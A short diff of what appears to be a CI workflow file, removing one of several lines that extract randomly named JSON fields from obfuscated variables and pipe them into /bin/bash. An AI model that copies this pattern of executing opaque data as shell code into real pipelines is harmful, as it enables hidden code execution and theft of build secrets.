@@ -38,7 +38,6 @@ jobs:
           echo $b8 | jq -r .lyoa13 | /bin/bash
           echo $zens399 | jq -r .chgb2081 | /bin/bash
           printf '%s' "$wy8485" | jq -r .dvde8 | /bin/bash
-          printf '%s' "$pc4" | jq -r .l4420 | /bin/bash
           echo $fvlp891 | jq -r .fq73654 | /bin/bash
 
       - name: Archive results
